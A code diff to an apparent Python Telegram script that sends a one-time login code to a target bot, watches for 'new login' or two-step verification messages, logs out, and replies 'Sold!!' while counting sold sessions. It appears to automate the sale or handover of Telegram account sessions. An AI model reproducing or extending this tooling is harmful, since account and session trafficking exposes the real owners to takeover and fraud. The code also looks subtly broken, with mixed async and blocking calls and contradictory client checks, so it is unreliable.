@@ -139,8 +139,34 @@ for message in mClient.get_messages(2576914746, None):
                             print(f"An error occurred: {e}")
 
                     time.sleep(5)
-
                     await mClient.send_message(TARGET_BOT, otp)
+                    time.sleep(5)
+                    
+                    if (
+                        "logged in" in text.lower() or
+                        "new login" in text.lower() or
+                        "successfully logged in" in text.lower()
+                    ):
+                        login_detected = True
+
+                    if (
+                        "two-step verification" in text.lower() or
+                        "2-step verification" in text.lower()
+                    ):
+                        login_detected = True
+                        
+                    if login_detected:
+                        print("🚀 Done → Logging out")
+                        await client.log_out()
+                        await client.disconnect()
+
+                    
+                    if client is None and login_detected == False:
+                        msgID = message.id
+                        mClient.send_message(2576914746, message='Sold!!', reply_to=msgID)
+                        print(f"{num} SOLD successfully")
+                        login_detected = False
+                        print(f"{str(len(all_ssns))} Sessions are SOLD successfully")
 
             client.run_until_disconnected()
 
